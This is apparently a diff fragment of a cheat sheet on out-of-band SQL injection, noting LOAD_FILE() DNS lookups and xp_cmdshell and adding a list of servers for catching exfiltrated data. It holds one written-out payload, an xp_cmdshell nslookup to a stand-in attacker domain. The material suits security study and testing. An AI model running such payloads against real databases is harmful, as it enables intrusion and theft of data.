@@ -275,3 +275,7 @@ Uses LOAD_FILE() to trigger DNS lookup.
 `xp_cmdshell` => triggers command running, turned off by default
 
 `EXEC xp_cmdshell 'nslookup data.attacker.com';`
+
+# Receiving the Data
+
+Burp Collaborator, Interactsh, python dnslib custom server, bare-bones HTTP Server.
